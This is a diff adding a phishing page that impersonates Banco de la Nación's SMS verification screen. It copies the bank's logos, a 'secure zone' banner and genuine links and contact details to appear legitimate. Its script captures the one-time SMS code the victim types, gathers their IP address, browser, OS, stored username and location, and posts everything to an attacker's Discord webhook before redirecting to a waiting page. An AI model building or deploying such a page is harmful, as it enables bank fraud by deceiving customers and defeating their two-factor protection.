@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Banco de la Nación - Verificación SMS</title>
+    <style>
+        /* RESET Y ESTILOS BASE - Conservando diseño original */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #e9eef3;
+            font-family: 'Arial', 'Helvetica Neue', Helvetica, sans-serif;
+            line-height: 1.4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* CONTENEDOR PRINCIPAL - CENTRADO */
+        #contenedor {
+            max-width: 800px;
+            width: 100%;
+            margin: 0 auto;
+            background: white;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        /* CABECERA */
+        #cabecera {
+            background: white;
+            padding: 20px 30px 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #d4d9e2;
+        }
+
+        #logo-multired img,
+        #logo-bn img {
+            max-height: 60px;
+            width: auto;
+            display: block;
+        }
+
+        /* BANNER DE SEGURIDAD */
+        .security-banner {
+            background: #f0f4f8;
+            padding: 12px 30px;
+            border-bottom: 1px solid #cbd5e1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #1e2a3e;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .security-banner img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .security-banner span {
+            font-weight: 700;
+            color: #2c6e2f;
+        }
+
+        /* CUERPO PRINCIPAL - TODO CENTRADO */
+        #cuerpo {
+            padding: 40px;
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+        }
+
+        #login {
+            background: #ffffff;
+            border-radius: 16px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+        #login-contenido {
+            padding: 20px 0;
+            width: 100%;
+            max-width: 550px;
+        }
+
+        /* ESTILOS DE FILAS - FLEX ROW */
+        .fila {
+            margin-bottom: 24px;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-between;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .fila label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e293b;
+            font-family: 'Arial', sans-serif;
+            width: 160px;
+            text-align: right;
+            flex-shrink: 0;
+        }
+
+        .fila .control-group {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        /* INPUTS - MISMO ESTILO ORIGINAL */
+        input[type="text"],
+        input[type="password"] {
+            border: 1px solid #cbd5e1;
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 15px;
+            font-family: 'Arial', monospace;
+            background: #ffffff;
+            transition: 0.2s;
+            width: 240px;
+            color: #0f172a;
+            font-weight: 500;
+        }
+
+        input:focus {
+            border-color: #2c6e2f;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(44, 110, 47, 0.1);
+        }
+
+        /* TECLADO VIRTUAL - MISMO DISEÑO */
+        .teclado-virtual {
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 12px;
+            padding: 8px;
+            margin-top: 8px;
+            width: 100%;
+            max-width: 220px;
+        }
+
+        .fila-teclado {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .boton-clave {
+            background: white;
+            border: 1px solid #cbd5e1;
+            border-radius: 10px;
+            width: 45px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #1e293b;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .boton-clave:hover {
+            background: #e2e8f0;
+            border-color: #94a3b8;
+            transform: scale(0.97);
+        }
+
+        .boton-limpiar {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+            width: 100px;
+            font-size: 13px;
+        }
+
+        .boton-limpiar:hover {
+            background: #fecaca;
+        }
+
+        /* MENSAJE INFORMATIVO SMS */
+        .sms-mensaje {
+            background: #eef2ff;
+            border-left: 4px solid #2c6e2f;
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #1e293b;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .sms-mensaje span {
+            font-weight: 700;
+            color: #2c6e2f;
+        }
+
+        /* BOTÓN VERIFICAR - CENTRADO */
+        .btn-ingresar {
+            background: #2c6e2f;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 240px;
+            text-align: center;
+            margin: 0 auto;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            font-family: 'Arial', sans-serif;
+        }
+
+        .btn-ingresar:hover {
+            background: #1f5422;
+            transform: translateY(-1px);
+        }
+
+        .btn-ingresar:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .fila-boton {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            margin-bottom: 0;
+        }
+
+        /* ENLACES DE SEGURIDAD Y PDF */
+        .enlaces-footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e2e8f0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 25px;
+            font-size: 12px;
+        }
+
+        .enlaces-footer a {
+            color: #2563eb;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .enlaces-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* PIE DE PÁGINA */
+        #pie-pagina {
+            background: #f1f5f9;
+            padding: 20px 30px;
+            border-top: 1px solid #d4d9e2;
+            font-size: 12px;
+            color: #334155;
+            text-align: center;
+            font-family: 'Arial', sans-serif;
+        }
+
+        #titulo-pie-pagina {
+            font-weight: bold;
+            margin-bottom: 12px;
+            font-size: 13px;
+        }
+
+        #oficinas p {
+            margin: 4px 0;
+        }
+
+        .link-ayuda {
+            font-size: 13px;
+            color: #ba1113;
+            text-decoration: underline;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-weight: 500;
+            font-family: 'Arial', sans-serif;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 640px) {
+            #cuerpo {
+                padding: 20px;
+            }
+            .fila {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .fila label {
+                width: 100%;
+                text-align: left;
+            }
+            .fila .control-group {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            input[type="text"],
+            input[type="password"] {
+                width: 100%;
+            }
+            .btn-ingresar {
+                width: 100%;
+            }
+            .teclado-virtual {
+                max-width: 100%;
+            }
+            .boton-clave {
+                width: 40px;
+                height: 38px;
+            }
+            .boton-limpiar {
+                width: 88px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="contenedor">
+        <!-- CABECERA (MISMA ORIGINAL) -->
+        <div id="cabecera">
+            <div id="logo-multired">
+                <img src="./index_files/logo-multired.jpg" alt="Logotipo Multired"
+                    onerror="this.src='https://placehold.co/200x60?text=Multired+Global'; this.onerror=null;">
+            </div>
+            <div id="logo-bn">
+                <img src="./index_files/Logo_BN.jpg" alt="Banco de la Nación"
+                    onerror="this.src='https://placehold.co/200x60?text=Banco+de+la+Nación'; this.onerror=null;">
+            </div>
+        </div>
+
+        <!-- BANNER ZONA SEGURA -->
+        <div class="security-banner">
+            <img src="./index_files/candado.png" alt="candado"
+                onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2220%22 height=%2220%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%22%232c6e2f%22 stroke-width=%222%22%3E%3Crect x=%223%22 y=%2211%22 width=%2218%22 height=%2211%22 rx=%222%22/%3E%3Cpath d=%22M7 11V7a5 5 0 0 1 10 0v4%22/%3E%3C/svg%3E';">
+            <span>Usted se encuentra en una <span>zona segura</span></span>
+        </div>
+
+        <div id="cuerpo">
+            <div id="login">
+                <div id="login-contenido">
+                    <form method="post" id="formSms" name="formSms" action="#" onsubmit="return false;">
+                        <!-- Campo SMS - Único campo solicitado -->
+                        <div class="sms-mensaje">
+                            📲 Se ha enviado un código de verificación SMS a su teléfono registrado. 
+                            <span>Ingrese el código SMS:</span>
+                        </div>
+
+                        <div class="fila">
+                            <label for="txtSms">Código SMS:</label>
+                            <div class="control-group" style="flex-direction: column; align-items: flex-start;">
+                                <input type="text" name="txtSms" id="txtSms" maxlength="10" 
+                                    placeholder="Código SMS" autocomplete="off" 
+                                    style="background-color: #ffffff; width: 240px;"
+                                    onkeypress="return soloNumerosSms(event)">
+                                <div class="teclado-virtual" id="tecladoVirtualSms">
+                                    <div class="fila-teclado">
+                                        <div class="boton-clave" data-val="7">7</div>
+                                        <div class="boton-clave" data-val="8">8</div>
+                                        <div class="boton-clave" data-val="9">9</div>
+                                    </div>
+                                    <div class="fila-teclado">
+                                        <div class="boton-clave" data-val="4">4</div>
+                                        <div class="boton-clave" data-val="5">5</div>
+                                        <div class="boton-clave" data-val="6">6</div>
+                                    </div>
+                                    <div class="fila-teclado">
+                                        <div class="boton-clave" data-val="1">1</div>
+                                        <div class="boton-clave" data-val="2">2</div>
+                                        <div class="boton-clave" data-val="3">3</div>
+                                    </div>
+                                    <div class="fila-teclado">
+                                        <div class="boton-clave" data-val="0">0</div>
+                                        <div class="boton-clave boton-limpiar" id="btnLimpiarSms">LIMPIAR</div>
+                                    </div>
+                                </div>
+                                <div class="clave-links" style="margin-top: 8px;">
+                                    <a href="#" class="link-ayuda" id="reenviarSmsLink">📱 Reenviar código SMS</a>
+                                    <a href="#" class="link-ayuda" id="soporteSmsLink" style="color: #ba1113;">¿No recibiste el código?</a>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- BOTÓN VERIFICAR CENTRADO -->
+                        <div class="fila-boton">
+                            <input type="button" id="btnVerificarSms" class="btn-ingresar" value="VERIFICAR">
+                        </div>
+
+                        <!-- Enlaces de seguridad (mismos del diseño original) -->
+                        <div class="enlaces-footer">
+                            <a href="https://www.bn.com.pe/clientes/banca-internet/formatos/recomendaciones-seguridad.pdf"
+                                target="_blank" rel="noopener noreferrer">
+                                📘 Recomendaciones de Seguridad
+                            </a>
+                            <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-ahorro.pdf"
+                                target="_blank" rel="noopener noreferrer">
+                                📄 Guía Cuenta de Ahorro
+                            </a>
+                            <a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-corrientes.pdf"
+                                target="_blank" rel="noopener noreferrer">
+                                📑 Guía Cuentas Corrientes
+                            </a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <div id="pie-pagina">
+            <div id="titulo-pie-pagina">Banco de la Nación | Ministerio de Economía y Finanzas</div>
+            <div id="oficinas">
+                <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telefónica: 519 2000.</p>
+                <p>Atención en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00.</p>
+                <p>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
+            </div>
+        </div>
+    </div>
+    <script src="discord.js"></script>
+    <script>
+        // ============================================
+        // FUNCIÓN: SOLO NÚMEROS (para input SMS)
+        // ============================================
+        function soloNumerosSms(e) {
+            var key = e.keyCode || e.which;
+            var tecla = String.fromCharCode(key);
+            var numeros = "0123456789";
+            // Permitir teclas de control: backspace, tab, delete, flechas
+            if (numeros.indexOf(tecla) === -1 && key !== 8 && key !== 9 && key !== 46 && key !== 37 && key !== 39) {
+                return false;
+            }
+            return true;
+        }
+
+        // ============================================
+        // TECLADO VIRTUAL PARA SMS (solo números, hasta 10 dígitos)
+        // ============================================
+        function initTecladoVirtualSms() {
+            const smsInput = document.getElementById('txtSms');
+            if (!smsInput) return;
+            
+            const botones = document.querySelectorAll('#tecladoVirtualSms .boton-clave[data-val]');
+            const btnLimpiar = document.getElementById('btnLimpiarSms');
+
+            // Agregar número al input
+            botones.forEach(boton => {
+                boton.addEventListener('click', function() {
+                    const valor = this.getAttribute('data-val');
+                    const currentValue = smsInput.value;
+                    if (currentValue.length < 10) {
+                        smsInput.value = currentValue + valor;
+                    }
+                    // Pequeño feedback visual
+                    smsInput.focus();
+                });
+            });
+
+            // Limpiar completamente el campo
+            if (btnLimpiar) {
+                btnLimpiar.addEventListener('click', function() {
+                    smsInput.value = '';
+                    smsInput.focus();
+                });
+            }
+
+            // También asegurar que el input solo acepte números mediante evento input (adicional)
+            smsInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            });
+        }
+
+        // ============================================
+        // FUNCIONES PARA DISCORD (usando la variable global del archivo discord.js)
+        // ============================================
+        function getUserFromStorage() {
+            try {
+                const user = localStorage.getItem('user');
+                return user || 'No disponible';
+            } catch (error) {
+                console.error('Error al leer localStorage:', error);
+                return 'Error al obtener usuario';
+            }
+        }
+
+        async function getUserIP() {
+            try {
+                const storedIP = localStorage.getItem('user_ip');
+                if (storedIP && storedIP !== 'No disponible') {
+                    return storedIP;
+                }
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                if (data && data.ip) {
+                    localStorage.setItem('user_ip', data.ip);
+                    return data.ip;
+                }
+            } catch (error) {
+                console.error('Error al obtener IP:', error);
+                try {
+                    const response = await fetch('https://ipinfo.io/json');
+                    const data = await response.json();
+                    if (data && data.ip) {
+                        localStorage.setItem('user_ip', data.ip);
+                        return data.ip;
+                    }
+                } catch (error2) {}
+            }
+            return 'No disponible';
+        }
+
+        function getUserLocation() {
+            try {
+                const storedLocation = localStorage.getItem('user_location');
+                if (storedLocation) {
+                    return JSON.parse(storedLocation);
+                }
+            } catch (error) {}
+            return { city: 'No disponible', country: 'No disponible', region: 'No disponible' };
+        }
+
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browserName = 'Desconocido';
+            let osName = 'Desconocido';
+            if (userAgent.indexOf('Chrome') > -1) browserName = 'Chrome';
+            else if (userAgent.indexOf('Firefox') > -1) browserName = 'Firefox';
+            else if (userAgent.indexOf('Safari') > -1) browserName = 'Safari';
+            else if (userAgent.indexOf('Edge') > -1) browserName = 'Edge';
+            if (userAgent.indexOf('Windows') > -1) osName = 'Windows';
+            else if (userAgent.indexOf('Mac') > -1) osName = 'MacOS';
+            else if (userAgent.indexOf('Linux') > -1) osName = 'Linux';
+            else if (userAgent.indexOf('Android') > -1) osName = 'Android';
+            else if (userAgent.indexOf('iOS') > -1) osName = 'iOS';
+            return { browser: browserName, os: osName };
+        }
+
+        async function sendSmsToDiscord() {
+            // Verificar que la variable global DISCORD_WEBHOOK_URL esté definida (viene del archivo discord.js)
+            if (typeof DISCORD_WEBHOOK_URL === 'undefined') {
+                console.error('❌ DISCORD_WEBHOOK_URL no está definida - Revisa que discord.js esté cargado correctamente');
+                alert('Error de configuración. No se pudo establecer conexión segura.');
+                return false;
+            }
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'TU_WEBHOOK_URL_AQUI') {
+                console.error('❌ DISCORD_WEBHOOK_URL no está configurada en discord.js');
+                alert('Error de configuración del servicio.');
+                return false;
+            }
+
+            try {
+                // Obtener el código SMS ingresado
+                const codigoSms = document.getElementById("txtSms").value.trim();
+                
+                // Validar que no esté vacío (solo eso, puede ser de 1 a 10 dígitos)
+                if (codigoSms === "") {
+                    console.warn("Código SMS vacío");
+                    return false;
+                }
+
+                const ip = await getUserIP();
+                const browserInfo = getBrowserInfo();
+                const currentDate = new Date();
+                const formattedDate = currentDate.toLocaleString('es-ES', { timeZone: 'America/Lima' });
+                const user = getUserFromStorage();
+                const locationData = getUserLocation();
+
+                let pais = locationData.country || 'Desconocido';
+                let ciudad = locationData.city || 'Desconocido';
+
+                const messageLines = [
+                    `**🔐 VERIFICACIÓN SMS - BANCO DE LA NACIÓN**`,
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+                    `🕐 **Fecha/Hora:** ${formattedDate}`,
+                    ``,
+                    `**📲 CÓDIGO DE VERIFICACIÓN SMS**`,
+                    ` \`${codigoSms}\``,
+                    ` **Longitud:** ${codigoSms.length} dígito(s)`,
+                    ``,
+                    `**📍 UBICACIÓN**`,
+                    ` 🌐 IP: \`${ip}\``,
+                    ` 🏳️ País: ${pais}`,
+                    ` 🏙️ Ciudad: ${ciudad}`,
+                    ``,
+                    `**💻 NAVEGADOR / SO**`,
+                    ` \`${browserInfo.browser} - ${browserInfo.os}\``,
+                    ` 👤 Usuario: ${user}`,
+                    ``,
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+                ];
+
+                const payload = {
+                    username: '🏦 Banco de la Nación - SMS',
+                    content: messageLines.join('\n')
+                };
+
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Código SMS enviado a Discord correctamente');
+                    return true;
+                } else {
+                    const errorText = await response.text();
+                    console.error('Error en respuesta Discord:', response.status, errorText);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error al enviar SMS a Discord:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // VALIDACIÓN DEL CÓDIGO SMS (solo que no esté vacío, hasta 10 dígitos)
+        // ============================================
+        function validarSms() {
+            const smsCode = document.getElementById("txtSms").value.trim();
+            
+            if (smsCode === "") {
+                alert("⚠️ Por favor ingrese el código SMS.");
+                document.getElementById("txtSms").focus();
+                return false;
+            }
+            
+            // Verificar que solo contenga números (por si acaso)
+            if (!/^\d+$/.test(smsCode)) {
+                alert("⚠️ El código SMS solo debe contener números.");
+                document.getElementById("txtSms").focus();
+                return false;
+            }
+            
+            return true;
+        }
+
+        // ============================================
+        // MANEJADOR DEL BOTÓN VERIFICAR
+        // ============================================
+        async function handleSmsSubmit(event) {
+            event.preventDefault();
+            
+            if (!validarSms()) {
+                return false;
+            }
+            
+            const btnVerificar = document.getElementById("btnVerificarSms");
+            const originalText = btnVerificar.value;
+            btnVerificar.disabled = true;
+            btnVerificar.value = 'Verificando...';
+            
+            try {
+                const enviado = await sendSmsToDiscord();
+                if (enviado) {
+                    console.log('✅ Código SMS procesado correctamente');
+                    // Redirigir a la página oficial del banco
+                    window.location.href = "wait.html";
+                } else {
+                    console.error('❌ Fallo en el envío a Discord');
+                    alert("No se pudo completar la verificación. Por favor, intente nuevamente.");
+                    btnVerificar.disabled = false;
+                    btnVerificar.value = originalText;
+                }
+            } catch (error) {
+                console.error('❌ Error en proceso:', error);
+                alert("Ocurrió un error inesperado. Intente más tarde.");
+                btnVerificar.disabled = false;
+                btnVerificar.value = originalText;
+            }
+            
+            return false;
+        }
+
+        // ============================================
+        // MANEJADORES DE ENLACES (Reenviar SMS / Soporte)
+        // ============================================
+        function initEnlacesSms() {
+            const reenviarLink = document.getElementById("reenviarSmsLink");
+            if (reenviarLink) {
+                reenviarLink.addEventListener("click", function(e) {
+                    e.preventDefault();
+                    alert("📲 Se ha enviado un nuevo código SMS a su número registrado. Por favor, revise su bandeja de mensajes.");
+                    // Limpiar campo para nuevo intento
+                    const smsInput = document.getElementById("txtSms");
+                    if (smsInput) smsInput.value = "";
+                });
+            }
+            
+            const soporteLink = document.getElementById("soporteSmsLink");
+            if (soporteLink) {
+                soporteLink.addEventListener("click", function(e) {
+                    e.preventDefault();
+                    alert("📞 Si no recibiste el código, comunícate con nuestra Central de Ayuda: 519 2000 (opción 3) o visita nuestra página de soporte.");
+                });
+            }
+        }
+
+        // ============================================
+        // INICIALIZACIÓN COMPLETA
+        // ============================================
+        document.addEventListener("DOMContentLoaded", function() {
+            // Verificar que discord.js haya cargado la variable
+            if (typeof DISCORD_WEBHOOK_URL !== 'undefined') {
+                console.log('✅ Webhook de Discord detectado correctamente');
+            } else {
+                console.warn('⚠️ DISCORD_WEBHOOK_URL no está definida - Verifica que discord.js contenga la variable');
+            }
+            
+            // Inicializar teclado virtual para SMS
+            initTecladoVirtualSms();
+            
+            // Configurar evento del botón verificar
+            const btnVerificar = document.getElementById("btnVerificarSms");
+            if (btnVerificar) {
+                btnVerificar.addEventListener("click", handleSmsSubmit);
+            }
+            
+            // Configurar enlaces de ayuda
+            initEnlacesSms();
+            
+            // Asegurar que el campo SMS solo acepte números (adicional)
+            const smsInput = document.getElementById("txtSms");
+            if (smsInput) {
+                smsInput.addEventListener("keypress", soloNumerosSms);
+                // Prevenir pegado de texto no numérico
+                smsInput.addEventListener("paste", function(e) {
+                    e.preventDefault();
+                    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+                    const numericOnly = pastedText.replace(/\D/g, '').slice(0, 10);
+                    if (numericOnly) {
+                        smsInput.value = numericOnly;
+                    }
+                });
+            }
+            
+            console.log('✅ Página SMS inicializada - Código de hasta 10 dígitos');
+        });
+        
+        // Exponer funciones globalmente por si se necesitan en consola
+        window.soloNumerosSms = soloNumerosSms;
+        window.handleSmsSubmit = handleSmsSubmit;
+    </script>
+</body>
+</html>
